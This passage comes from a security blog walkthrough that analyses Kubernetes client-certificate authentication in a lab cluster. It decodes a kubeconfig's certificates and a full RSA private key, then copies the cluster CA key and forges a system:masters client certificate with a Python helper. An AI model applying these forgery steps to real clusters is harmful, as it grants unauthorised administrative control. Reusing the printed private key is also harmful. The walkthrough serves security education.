* **Subject** - This has the value `CN = kubernetes`, which names the entity that the certificate represents.
* **Issuer** - This contains the value `CN = kubernetes`, which names the entity that issued the certificate. The fact this value matches the **Subject** suggests the certificate is self issued, a root CA.
* **X509v3 Key Usage** - Which contains the values `Digital Signature, Key Encipherment, Certificate Sign`, which lists the purposes for which the certificate is intended to be used for.
* **X509v3 Subject Key Identifier** - Which has the value `E0:61:B0:F8:37:C8:BB:3E:0A:52:EC:E2:AE:11:BE:71:94:41:C4:9C`, which uniquely identifies the cryptographic key associated with the certificate. 

So from this, we know that this certificate is used to identify other certificates being used with "kubernetes", and we have the unique identifier of the key whose signatures will be used to verify this association. 

These will become relevant later.

The fact that the Subject and Issuer match and that there is no Authority Key Identifier also suggests that this is a root CA - the start of it's own chain of trust. We can confirm this by trying to verify the authenticity of the certificate using it's own included public key using openssl like so.

```
stephen@kubemaster:~/certs$ openssl verify -verbose -CAfile ca.crt ca.crt
ca.crt: OK
```

This verifies this certificate is a self signed root CA.

Now let's look at the blob from `client-certificate-data` in the same manner.

```
stephen@kubemaster:~/certs$ echo 'LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJV28rZ1plVWE3dzR3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TXpFeE1EZ3dNVEl3TkRaYUZ3MHlOREV4TURjd01USTFORGRhTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXloQjFlR2JmNjBUUjE5RmYKUVdYb1VmTFVNWUFERnUydDBrL1ZUbDNSYzN6VVU0bjlvYU9VME5EQ1psNzIxK3Z4RS9ISnZxdnIrTDkzbHBWTwpnRVo3dytXT1MyN2ViL2Nrd0pwYlRheHB2WGYxdFlqNm9ub1lGSUNuWTlCMGE2SG91dC9hZ1UzQUtSRmNTK0NGCkVKVU9udnkrOHF0Y1luT2RBR2Jpd1ZieXJDWlNsVVVQMnZvOWNpcC9hUUJsSk96NEs4bTlSa3hoUjFBV3FUdU4KQkRMWTVMUlN1SHNOWTRnTk8yankzcU5qUjBxS0RFZ29IMmhKUnFmR3M4ZWdMVFM3OVBMdnFkbHJ2di8waHdUWQp1UXVoNWZOWW5SRkZwR1RreFR1b2wvNWNBWmlnQkRraUtrR0c2UFR2R2tiRWd6QTNveDZIckljcFZNSHpEdzRRCjhUOEVMUUlEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JUZ1liRDROOGk3UGdwUzdPS3VFYjV4bEVIRQpuREFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBbmNuVnBDYUg5ck9GQkExMW5DalhISzAwRG13R1FJZnpjV2x0CkJ3RzRwR2lTK0RRR3ltODFwVEtHblhTQU1UZENvVmI2QzlrdWMrWkR0bG5iL05xZUk2WHpnVjdVbXp2V0E0N0gKSThvSHl5V3RjY1pNcUNwOTNnZUJDb3lZdW42SkpnTVozbHJhRTN6U1hxU0xzQ0hZWXpJZlRLWnFRdFFhbnBaNAp3SUVIMlBtZ1FxMmR4bmtoak9JSWF0bm54U0owdno1MDlXQVBQOStrSEpVeUh2N1V0a0pDL2J3aE5SdDh1RmluClBsN3Z3NGRUY1p4dS81SHlqcnlRcUVKUFBHS2ZnRlBja0dyclBXL1I1bUJHclVxRlZqYXN0TGQzekNMNG1GT0UKUWdyOTNMajh2ZnA1dFQrbFljRUkrYit3czdJaWFUQW9OdktVQXd4bXFmVzl2L1ZyZFE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==' | base64 -d > client.crt
stephen@kubemaster:~/certs$ cat client.crt
-----BEGIN CERTIFICATE-----
MIIDITCCAgmgAwIBAgIIWo+gZeUa7w4wDQYJKoZIhvcNAQELBQAwFTETMBEGA1UE
AxMKa3ViZXJuZXRlczAeFw0yMzExMDgwMTIwNDZaFw0yNDExMDcwMTI1NDdaMDQx
FzAVBgNVBAoTDnN5c3RlbTptYXN0ZXJzMRkwFwYDVQQDExBrdWJlcm5ldGVzLWFk
bWluMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyhB1eGbf60TR19Ff
QWXoUfLUMYADFu2t0k/VTl3Rc3zUU4n9oaOU0NDCZl721+vxE/HJvqvr+L93lpVO
gEZ7w+WOS27eb/ckwJpbTaxpvXf1tYj6onoYFICnY9B0a6Hout/agU3AKRFcS+CF
EJUOnvy+8qtcYnOdAGbiwVbyrCZSlUUP2vo9cip/aQBlJOz4K8m9RkxhR1AWqTuN
BDLY5LRSuHsNY4gNO2jy3qNjR0qKDEgoH2hJRqfGs8egLTS79PLvqdlrvv/0hwTY
uQuh5fNYnRFFpGTkxTuol/5cAZigBDkiKkGG6PTvGkbEgzA3ox6HrIcpVMHzDw4Q
8T8ELQIDAQABo1YwVDAOBgNVHQ8BAf8EBAMCBaAwEwYDVR0lBAwwCgYIKwYBBQUH
AwIwDAYDVR0TAQH/BAIwADAfBgNVHSMEGDAWgBTgYbD4N8i7PgpS7OKuEb5xlEHE
nDANBgkqhkiG9w0BAQsFAAOCAQEAncnVpCaH9rOFBA11nCjXHK00DmwGQIfzcWlt
BwG4pGiS+DQGym81pTKGnXSAMTdCoVb6C9kuc+ZDtlnb/NqeI6XzgV7UmzvWA47H
I8oHyyWtccZMqCp93geBCoyYun6JJgMZ3lraE3zSXqSLsCHYYzIfTKZqQtQanpZ4
wIEH2PmgQq2dxnkhjOIIatnnxSJ0vz509WAPP9+kHJUyHv7UtkJC/bwhNRt8uFin
Pl7vw4dTcZxu/5HyjryQqEJPPGKfgFPckGrrPW/R5mBGrUqFVjastLd3zCL4mFOE
Qgr93Lj8vfp5tT+lYcEI+b+ws7IiaTAoNvKUAwxmqfW9v/VrdQ==
-----END CERTIFICATE-----
```

Another certificate. let's parse with openssl again.

```
stephen@kubemaster:~/certs$ openssl x509 -in client.crt -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 6525610744579026702 (0x5a8fa065e51aef0e)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN = kubernetes
        Validity
            Not Before: Nov  8 01:20:46 2023 GMT
            Not After : Nov  7 01:25:47 2024 GMT
        Subject: O = system:masters, CN = kubernetes-admin
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ca:10:75:78:66:df:eb:44:d1:d7:d1:5f:41:65:
                    e8:51:f2:d4:31:80:03:16:ed:ad:d2:4f:d5:4e:5d:
                    d1:73:7c:d4:53:89:fd:a1:a3:94:d0:d0:c2:66:5e:
                    f6:d7:eb:f1:13:f1:c9:be:ab:eb:f8:bf:77:96:95:
                    4e:80:46:7b:c3:e5:8e:4b:6e:de:6f:f7:24:c0:9a:
                    5b:4d:ac:69:bd:77:f5:b5:88:fa:a2:7a:18:14:80:
                    a7:63:d0:74:6b:a1:e8:ba:df:da:81:4d:c0:29:11:
                    5c:4b:e0:85:10:95:0e:9e:fc:be:f2:ab:5c:62:73:
                    9d:00:66:e2:c1:56:f2:ac:26:52:95:45:0f:da:fa:
                    3d:72:2a:7f:69:00:65:24:ec:f8:2b:c9:bd:46:4c:
                    61:47:50:16:a9:3b:8d:04:32:d8:e4:b4:52:b8:7b:
                    0d:63:88:0d:3b:68:f2:de:a3:63:47:4a:8a:0c:48:
                    28:1f:68:49:46:a7:c6:b3:c7:a0:2d:34:bb:f4:f2:
                    ef:a9:d9:6b:be:ff:f4:87:04:d8:b9:0b:a1:e5:f3:
                    58:9d:11:45:a4:64:e4:c5:3b:a8:97:fe:5c:01:98:
                    a0:04:39:22:2a:41:86:e8:f4:ef:1a:46:c4:83:30:
                    37:a3:1e:87:ac:87:29:54:c1:f3:0f:0e:10:f1:3f:
                    04:2d
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Authority Key Identifier:
                E0:61:B0:F8:37:C8:BB:3E:0A:52:EC:E2:AE:11:BE:71:94:41:C4:9C
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        9d:c9:d5:a4:26:87:f6:b3:85:04:0d:75:9c:28:d7:1c:ad:34:
        0e:6c:06:40:87:f3:71:69:6d:07:01:b8:a4:68:92:f8:34:06:
        ca:6f:35:a5:32:86:9d:74:80:31:37:42:a1:56:fa:0b:d9:2e:
        73:e6:43:b6:59:db:fc:da:9e:23:a5:f3:81:5e:d4:9b:3b:d6:
        03:8e:c7:23:ca:07:cb:25:ad:71:c6:4c:a8:2a:7d:de:07:81:
        0a:8c:98:ba:7e:89:26:03:19:de:5a:da:13:7c:d2:5e:a4:8b:
        b0:21:d8:63:32:1f:4c:a6:6a:42:d4:1a:9e:96:78:c0:81:07:
        d8:f9:a0:42:ad:9d:c6:79:21:8c:e2:08:6a:d9:e7:c5:22:74:
        bf:3e:74:f5:60:0f:3f:df:a4:1c:95:32:1e:fe:d4:b6:42:42:
        fd:bc:21:35:1b:7c:b8:58:a7:3e:5e:ef:c3:87:53:71:9c:6e:
        ff:91:f2:8e:bc:90:a8:42:4f:3c:62:9f:80:53:dc:90:6a:eb:
        3d:6f:d1:e6:60:46:ad:4a:85:56:36:ac:b4:b7:77:cc:22:f8:
        98:53:84:42:0a:fd:dc:b8:fc:bd:fa:79:b5:3f:a5:61:c1:08:
        f9:bf:b0:b3:b2:22:69:30:28:36:f2:94:03:0c:66:a9:f5:bd:
        bf:f5:6b:75
```

Let's examine at some of the relevant fields again.
* **X509v3 Basic Constraints** - This contains the value `CA:FALSE` which identifies the certificate is NOT a Certificate Authority.
* **Subject** - This has the value `O = system:masters, CN = kubernetes-admin`, which names the entity that the certificate represents. We will talk about the significance of the values later.
* **Issuer** - This contains the value `CN = kubernetes`, which names the entity that issued the certificate. It matches the **Subject** from the previous certificate, suggesting (but not proving) the previous certificate signed this one.
* **X509v3 Authority Key Identifier** - Which has the value `E0:61:B0:F8:37:C8:BB:3E:0A:52:EC:E2:AE:11:BE:71:94:41:C4:9C`, which uniquely identifies the key pair (public+private key) associated with certificate that issued this certificate. It matches the **X509v3 Subject Key Identifier** value from the previous certificate, suggesting (but again not proving) that certificate signed this one.
* **X509v3 Extended Key Usage** - Which contains the values `TLS Web Client Authentication`, which lists the "extended" purpose for which the certificate is intended to be used for. This refers to a certificate used for for TLS client authentication. This is the relatively infrequently appearing use case where the client in a TLS session uses a certificate to identify itself to the server, as opposed to the most common scenario where only the server uses an identifying certificate.

These fields suggest that this certificate was issued by the first CA certificate we examined, but we dont know this for sure unless we can confirm that the private key associated with the first certificate was used to sign this certificate. This can be done using openssl again.

```
stephen@kubemaster:~/certs$ openssl verify -verbose -CAfile ca.crt client.crt
client.crt: OK
```

This verifies that this certificate was issued by the first CA certificate - it is part of it's chain of trust.

Let's now examine the final blob named `client-key-data`.

```
stephen@kubemaster:~/certs$ echo 'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBeWhCMWVHYmY2MFRSMTlGZlFXWG9VZkxVTVlBREZ1MnQway9WVGwzUmMzelVVNG45Cm9hT1UwTkRDWmw3MjErdnhFL0hKdnF2citMOTNscFZPZ0VaN3crV09TMjdlYi9ja3dKcGJUYXhwdlhmMXRZajYKb25vWUZJQ25ZOUIwYTZIb3V0L2FnVTNBS1JGY1MrQ0ZFSlVPbnZ5KzhxdGNZbk9kQUdiaXdWYnlyQ1pTbFVVUAoydm85Y2lwL2FRQmxKT3o0SzhtOVJreGhSMUFXcVR1TkJETFk1TFJTdUhzTlk0Z05PMmp5M3FOalIwcUtERWdvCkgyaEpScWZHczhlZ0xUUzc5UEx2cWRscnZ2LzBod1RZdVF1aDVmTlluUkZGcEdUa3hUdW9sLzVjQVppZ0JEa2kKS2tHRzZQVHZHa2JFZ3pBM294NkhySWNwVk1IekR3NFE4VDhFTFFJREFRQUJBb0lCQURpZmhodVlVSFZBVXNGMApwWW5SQWRvOC91TmtLUGw2M3pQSk5WQUJrRmtaaVBKai85UVUzL1hvR2lIUHlNSlhGclp0RWdqQmFwM0pJYnpyCjJCU3dLNnlJbm1oYkNEQStCR21JbDc5YmFrSXk1SUxiZ01pWkNEaHVtUG1xaDRWRjJNN05QaER2OWNKTVlCM1AKSzlxcXVtOHBDbVU4U2VZNDJhMHNKNnpnTFo2NW12L1pwVWJrRDVXMGtFckNtcldWYXBrb0dHUzMraEVmZ0xuVQo3WmkwWmQxSm04RFpBcVBaZjB2K2xEcTRRNlA2cFRyWkZhSHRKeXE1R3BaaG5LdzFRSVAvZDM4SkdrWmJ2bDZTCmdLdWREZHR3UWtLWDhFc3hzUElzcHFYWmlJRnRHbEd4UjNWT3lSaXo1WlIvTDVQUDYvSHZ5QjZVMVMzU0MydW0KMGc1TW9xMENnWUVBNVA3K3J6Yjh0WkFQQzdMdTAwcm5CeUZLVWoyWUVKU3hwLy8wREtuWGtmcTZ2a01wZmo1TwpRNC8vcVJxMFBsTXlIbFF3dFpkVXdmb0Raem1tSUZGYkNucDhoYWl5Z3JVMldVZjRkc0Y4ZVExN0NPVHhURGkzCndqL3Z5MXNtaUw2OEVIMjNNeW94YitXamRaZUJKQVRSS05pWDFvbHFFUE5xVlRrd21TZkl2b01DZ1lFQTRlUncKWUNpKytqUnVwTEMzb0FvYzZWTU9zZllJdkhhTG5iQkx0SVVZWnFpaU5Namp1UHJnSE0vcnRCc3BPYmhWSCtpdQpOZ0YrS2pMa1ZsY0Rxd1NuQ20vcEdoVCtXeFhVdjNpRjRHSWQ5cm5iYVhRbklIbzNLWk56VzRKWDJ1b2d0dmFaCjVNS3JiVHg4QnpjRGhIMDFGdEtBM1VycGFTTU9vN3h2blVUTnM0OENnWUVBa05DbGRWN2J2MkpEOFkwTnRYZG4KMUwxN3g3aUdBdTVWenoxeE05VHdxN09aQnh0b0VSc0wyWFFtSk9YcldJSzZiaTJseENEWWkvYzAwY0hHU2lmSQo0RDZIb3VzRlFOMmlhaUcyZ2p0b0lSR2lYZ1NTaURaU0Z6amh4NE4wUWdRRTRKVHdGeDQydDJITTFsK2lYb25oClQraHhWVTMvVW9ydEVzb2c3cW9YTEVzQ2dZQkt4ek9JTVpUZkFRSnJsSENGRXpQMDdXRGMrcVJ6dHc2SzJmU0YKd3RXTURtRDc5bENrU0xCdCtVcCtxY3NnNTJ1T2o1azBHWlJwWmNWKzYzazBZT3JuSXByWTNvQkJLTjN2c0hjcApDM0g5M2hMTE92OUUyaEJ1dS9naEgrbnpkelB6UFhrK2FFOFZiME5qcEF1UERWL0l1VkNkY1JJSmt1aGl2WnQ1ClJYQ084d0tCZ0NFVGU1bm9xMFRHL2xVSFRnYVU0L3lBdi8rZjc5azlTOWw4a2xxR2RPSnBZZVZRVHdvSjZ1b1oKRndUMGhXYXdjK3NSWXRGeGxYMUhzV2huWmNLbVg3OGxJM2pLRDFwYXVrZURhVjFzQ0p4QnlIWVVSOXN2aWM5ZgplektZVHdCS1NLN2NPaTVPNFlPV3J1N255TTVXdEhHN25CVngxNmJTaHJRL2Nzc3A3UWVxCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg==' | base64 -d > client.key
(crypto) stephen@kubemaster:~/certs$ cat client.key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAyhB1eGbf60TR19FfQWXoUfLUMYADFu2t0k/VTl3Rc3zUU4n9
oaOU0NDCZl721+vxE/HJvqvr+L93lpVOgEZ7w+WOS27eb/ckwJpbTaxpvXf1tYj6
onoYFICnY9B0a6Hout/agU3AKRFcS+CFEJUOnvy+8qtcYnOdAGbiwVbyrCZSlUUP
2vo9cip/aQBlJOz4K8m9RkxhR1AWqTuNBDLY5LRSuHsNY4gNO2jy3qNjR0qKDEgo
H2hJRqfGs8egLTS79PLvqdlrvv/0hwTYuQuh5fNYnRFFpGTkxTuol/5cAZigBDki
KkGG6PTvGkbEgzA3ox6HrIcpVMHzDw4Q8T8ELQIDAQABAoIBADifhhuYUHVAUsF0
pYnRAdo8/uNkKPl63zPJNVABkFkZiPJj/9QU3/XoGiHPyMJXFrZtEgjBap3JIbzr
2BSwK6yInmhbCDA+BGmIl79bakIy5ILbgMiZCDhumPmqh4VF2M7NPhDv9cJMYB3P
K9qqum8pCmU8SeY42a0sJ6zgLZ65mv/ZpUbkD5W0kErCmrWVapkoGGS3+hEfgLnU
7Zi0Zd1Jm8DZAqPZf0v+lDq4Q6P6pTrZFaHtJyq5GpZhnKw1QIP/d38JGkZbvl6S
gKudDdtwQkKX8EsxsPIspqXZiIFtGlGxR3VOyRiz5ZR/L5PP6/HvyB6U1S3SC2um
0g5Moq0CgYEA5P7+rzb8tZAPC7Lu00rnByFKUj2YEJSxp//0DKnXkfq6vkMpfj5O
Q4//qRq0PlMyHlQwtZdUwfoDZzmmIFFbCnp8haiygrU2WUf4dsF8eQ17COTxTDi3
wj/vy1smiL68EH23Myoxb+WjdZeBJATRKNiX1olqEPNqVTkwmSfIvoMCgYEA4eRw
YCi++jRupLC3oAoc6VMOsfYIvHaLnbBLtIUYZqiiNMjjuPrgHM/rtBspObhVH+iu
NgF+KjLkVlcDqwSnCm/pGhT+WxXUv3iF4GId9rnbaXQnIHo3KZNzW4JX2uogtvaZ
5MKrbTx8BzcDhH01FtKA3UrpaSMOo7xvnUTNs48CgYEAkNCldV7bv2JD8Y0NtXdn
1L17x7iGAu5Vzz1xM9Twq7OZBxtoERsL2XQmJOXrWIK6bi2lxCDYi/c00cHGSifI
4D6HousFQN2iaiG2gjtoIRGiXgSSiDZSFzjhx4N0QgQE4JTwFx42t2HM1l+iXonh
T+hxVU3/UortEsog7qoXLEsCgYBKxzOIMZTfAQJrlHCFEzP07WDc+qRztw6K2fSF
wtWMDmD79lCkSLBt+Up+qcsg52uOj5k0GZRpZcV+63k0YOrnIprY3oBBKN3vsHcp
C3H93hLLOv9E2hBuu/ghH+nzdzPzPXk+aE8Vb0NjpAuPDV/IuVCdcRIJkuhivZt5
RXCO8wKBgCETe5noq0TG/lUHTgaU4/yAv/+f79k9S9l8klqGdOJpYeVQTwoJ6uoZ
FwT0hWawc+sRYtFxlX1HsWhnZcKmX78lI3jKD1paukeDaV1sCJxByHYUR9svic9f
ezKYTwBKSK7cOi5O4YOWru7nyM5WtHG7nBVx16bShrQ/cssp7Qeq
-----END RSA PRIVATE KEY-----
```

OK, this appears to be an RSA private key, and it's likely this key is associated with the client certificate we just viewed. 


Let's parse it in openssl to confirm this. 


```
stephen@kubemaster:~/certs$ openssl rsa -in client.key -noout -text
Private-Key: (2048 bit, 2 primes)
modulus:
    00:ca:10:75:78:66:df:eb:44:d1:d7:d1:5f:41:65:
    e8:51:f2:d4:31:80:03:16:ed:ad:d2:4f:d5:4e:5d:
    d1:73:7c:d4:53:89:fd:a1:a3:94:d0:d0:c2:66:5e:
    f6:d7:eb:f1:13:f1:c9:be:ab:eb:f8:bf:77:96:95:
    4e:80:46:7b:c3:e5:8e:4b:6e:de:6f:f7:24:c0:9a:
    5b:4d:ac:69:bd:77:f5:b5:88:fa:a2:7a:18:14:80:
    a7:63:d0:74:6b:a1:e8:ba:df:da:81:4d:c0:29:11:
    5c:4b:e0:85:10:95:0e:9e:fc:be:f2:ab:5c:62:73:
    9d:00:66:e2:c1:56:f2:ac:26:52:95:45:0f:da:fa:
    3d:72:2a:7f:69:00:65:24:ec:f8:2b:c9:bd:46:4c:
    61:47:50:16:a9:3b:8d:04:32:d8:e4:b4:52:b8:7b:
    0d:63:88:0d:3b:68:f2:de:a3:63:47:4a:8a:0c:48:
    28:1f:68:49:46:a7:c6:b3:c7:a0:2d:34:bb:f4:f2:
    ef:a9:d9:6b:be:ff:f4:87:04:d8:b9:0b:a1:e5:f3:
    58:9d:11:45:a4:64:e4:c5:3b:a8:97:fe:5c:01:98:
    a0:04:39:22:2a:41:86:e8:f4:ef:1a:46:c4:83:30:
    37:a3:1e:87:ac:87:29:54:c1:f3:0f:0e:10:f1:3f:
    04:2d
publicExponent: 65537 (0x10001)
[....SNIP....]
```

I've truncated the output above in the interests of space to show the relevant parts of the key - the public modulus and exponent, which are the same values as shown in the `Subject Public Key Info` field from the client certificate. This tells us that the client key and certificate we have are associated.

Visually comparing the large text representations of the modulus in the certificate and key openssl outputs like we just did to confirm they match is potentially error prone, so theres a more robust approach we can use to do this more definitively. 

We can extract the modulus of the public key from each file, hash it using a secure algorithm, and then compare the much shorter hash outputs to confirm they match. Here is how that looks using the `sha256` algorithm:

```
stephen@kubemaster:~/certs$ openssl rsa -modulus -noout -in client.key | openssl sha256
SHA256(stdin)= b357a8d244376e9a6a606583df4ea37114c8ff838241479cfe8a57fe76dadb0c
stephen@kubemaster:~/certs$ openssl x509 -modulus -noout -in client.crt | openssl sha256
SHA256(stdin)= b357a8d244376e9a6a606583df4ea37114c8ff838241479cfe8a57fe76dadb0c
```

So we have a client X.509 certificate intended for TLS client authentication, as well as the associated private key, and we know that the certificate is trusted by the "kubernetes" CA. What is the significance of this?

Let's see what happens if we try and make a request to the API server address we got from our config file directly in curl.

```
stephen@kubemaster:~/certs$ curl https://kubemaster.thezoo.local:6443/api
curl: (60) SSL certificate problem: unable to get local issuer certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
```

OK, this is suggesting that the certificate used by the API servers TLS configuration is not trusted by curls certificate store. 

What if we try again, but we tell curl to use our CA certificate from the config file to verify the remote TLS service?

```
stephen@kubemaster:~/certs$ curl --cacert ca.crt https://kubemaster.thezoo.local:6443/
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {},
  "code": 403
}
```

Now the TLS session works fine, but we are getting a forbidden error message from the API server.

What if we try again, but try and do TLS client based authentication using our extracted client certificate and key?

```
stephen@kubemaster:~/certs$ curl --cacert ca.crt --cert client.crt --key client.key  https://kubemaster.thezoo.local:6443/
{
  "paths": [
    "/.well-known/openid-configuration",
    "/api",
    "/api/v1",
    "/apis",
    "/apis/",
    "/apis/admissionregistration.k8s.io",
    "/apis/admissionregistration.k8s.io/v1",
    "/apis/apiextensions.k8s.io",
[....SNIP....]
```

Now we are authenticated to the API server!

## From the documentation...

So all of this analysis was basically a really long winded way of verifying that Kubernetes is using TLS client based authentication to identify users. 

Indeed, if you read the [authentication documentation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/) I referenced earlier in this post, it will tell you exactly that. Hopefully this process of analysing the various components and seeing how they are inter-related helped you understand how this works and how to identify when it might be in use in other systems that are not as well documented however.

The documentation also says something else thats quite interesting:

> In this regard, Kubernetes does not have objects which represent normal user accounts. Normal users cannot be added to a cluster through an API call.
> 
> Even though a normal user cannot be added via an API call, any user that presents a valid certificate signed by the cluster's certificate authority (CA) is considered authenticated. In this configuration, Kubernetes determines the username from the common name field in the 'subject' of the cert (e.g., "/CN=bob"). From there, the role based access control (RBAC) sub-system would determine whether the user is authorized to perform a specific operation on a resource. For more details, refer to the normal users topic in certificate request for more details about this.


Looking at the Subject value from our client certificate `O = system:masters, CN = kubernetes-admin` - this is the value thats being referred to here. The username we logon as with our certificate is `kubernetes-admin`, and `system:masters` is presented to the authorization system to determine what we can do.

## Forging user certificates

Something the documentation does not explicitly say, is that if we can get our hands on the key associated with the Kubernetes root CA certificate, we can create our own arbitrary client certificates (although once you understand how X.509 systems work this conclusion is straightforward).

The `kube-controller-manager` pod has access to this key, which is referred to as the `cluster-signing-key-file`. The runtime configuration of the pod will tell you where the key is being accessed from.

We can find this location by first geting the name of the correct pod (which will be different depending on the domain name of your Kubernetes host).
```
stephen@kubemaster:~/certs$ kubectl -n kube-system get pods | grep controller-manager
kube-controller-manager-kubemaster.thezoo.local   1/1     Running   0          7d5h
```

Then get the appropriate runtime configuration setting using a command like the following (substitute the name of your controller-manager in the command below, mine is `kube-controller-manager-kubemaster.thezoo.local`):

```
stephen@kubemaster:~/certs$ kubectl -n kube-system describe pods kube-controller-manager-kubemaster.thezoo.local | grep cluster-signing-key-file
      --cluster-signing-key-file=/etc/kubernetes/pki/ca.key
```

Let's take a local copy of the key and check it to confirm the key matches the CA certificate by using the public modulus hash comparing approach used above.

```
stephen@kubemaster:~/certs$ sudo cp /etc/kubernetes/pki/ca.key .
stephen@kubemaster:~/certs$ sudo chown stephen:stephen ca.key
stephen@kubemaster:~/certs$ openssl rsa -modulus -noout -in ca.key | openssl sha256
SHA256(stdin)= a6f3d5be9a4e70fbac48dbdf7427bfae278106ba001db3340b3e608f2288efed
stephen@kubemaster:~/certs$ openssl x509 -modulus -noout -in ca.crt | openssl sha256
SHA256(stdin)= a6f3d5be9a4e70fbac48dbdf7427bfae278106ba001db3340b3e608f2288efed
```

The hashes match - we can use this key to create our own authentication certificates.

Forging an X.509 certificate using only openssl that will work with Kubernetes is a little more awkward than I would like, so I created a file with a number of helper functions in Python to make it easier. Most of it is boilerplate stuff that works with keys and certificates to convert them between files on disk and Python objects, with the unique work being done by a function named `create_certificate`.

The `create_certificate` function creates a new X.509 certificate with all the expected static fields and values expected by Kubernetes for a client certificate, with some of the more specific steps being that it:
* Sets the the Subject with the Common Name matching our chosen username and Origanization Names matching our desired roles;
* Sets the Issuer of our certificate to match the Subject from the CA's certificate;
* Sets the Authority Key Identifier to match the ID of the CA's public key;
* Signs the certificate using the CA's private key; and
* Optionally performs signature verification and Issuer-Subject matching of the new certificate against the CA certificate.



The following steps will get the code and setup a python venv that we can use on our Ubuntu system to do the forging. (The venv setup is necessary as the Kubernetes setup guide referenced above installs a version of the Python cryptopgraphy library that is incompatible with this code).

```
stephen@kubemaster:~/certs$ wget https://raw.githubusercontent.com/stephenbradshaw/pentesting_stuff/master/example_code/crypto_helpers.py
stephen@kubemaster:~/certs$ sudo apt -y install python3-pip python3.10-venv
stephen@kubemaster:~/certs$ python3 -m venv crypto
stephen@kubemaster:~/certs$ source crypto/bin/activate
(crypto) stephen@kubemaster:~/certs$ pip install PyJWT cryptography ipython
```

From here we are going to be running the appropriate functions to do the client certificate forgery from within iPython. You can see [this blog post](https://thegreycorner.com/2023/08/16/iPython-for-cyber-security.html) for some more background info on doing security stuff in iPython if you're interested.

The following commented iPython session shows the steps required to use the `create_certificate` function to create a forged certificate and write it's output to disk in the present working directory as `forged.crt` and `forged.key`.

```
(crypto) stephen@kubemaster:~/certs$ ipython
Python 3.10.12 (main, Jun 11 2023, 05:26:28) [GCC 11.4.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.17.2 -- An enhanced Interactive Python. Type '?' for help.

In [1]: # read file containing helper functions into Python memory

In [2]: exec(open('crypto_helpers.py').read())

In [3]: # create a new private key

In [4]: forged_private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

In [5]: # get the public key from the new private key

In [6]: forged_public_key = forged_private_key.public_key()

In [7]: # read the CAs private key from disk

In [8]: ca_private_key = private_key_from_file('ca.key')

In [9]: # read the CA certificate from disk

In [10]: ca_cert = cert_from_file('ca.crt')

In [11]: # create a forged certificate associated with our new key for 'stephen' with highly privileged roles 'system:masters'

In [12]: forged_cert = create_certificate(forged_public_key, ca_private_key, ca_cert, common_name='stephen', org_names = ['system:masters'])

In [13]: # write forged cert to disk as 'forged.crt'

In [14]: cert_to_disk(forged_cert, 'forged.crt')

In [15]: # write new private key to disk as 'forged.crt'

In [16]: private_key_to_disk(forged_private_key, 'forged.key')

In [17]: exit
```


Now we have our forged key and certificate on disk, let's try them with curl to confirm they work.

```
stephen@kubemaster:~/certs$ curl --cert forged.crt --key forged.key --cacert ca.crt https://kubemaster.thezoo.local:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.10.123:6443"
    }
  ]
}
```

We have now successfully created our own X.509 client authentication certificate for Kubernetes!



# Service account JWT based authentication

Next let's look at the other most commonly used Kubernetes authentication scenario - service accounts used by system entities. Unlike people accounts, these need to be added to the Kubernetes system with permissions assigned before they can be used. We cant just make up our own arbitrary names and assign permissions like we just did with user accounts. In addition, service accounts are bound to particular namespaces, unlike normal user accounts which are cluster wide, which means we have to consider this when authenticating.

We will explore service account authentication via the medium of the `default:default` service account (e.g. the account named `default` in the `default` namespace). This account exists in a base install and will be automatically mounted for use by running pods in the `default` namespace.

To make it a bit easier to tell whether we are authenticated as it or not we are going to grant this account some additional permissions it does not normally have - view access to resources in the `default` namespace.

We can do this like so:

```
(crypto) stephen@kubemaster:~/certs$ kubectl create rolebinding default-view --clusterrole=view --serviceaccount=default:default --namespace=default
rolebinding.rbac.authorization.k8s.io/default-view created
```

## Using the service account from within a pod

Now we are going to gain access to a running pod in the `default` namespace in order to use this service account.

First let's identify our running pods in this namespace. Here are mine, created as part of the setup tutorial linked earlier.

```
(crypto) stephen@kubemaster:~/certs$ kubectl get pods
NAME                        READY   STATUS    RESTARTS   AGE
nginx-app-5777b5f95-97489   1/1     Running   0          3h55m
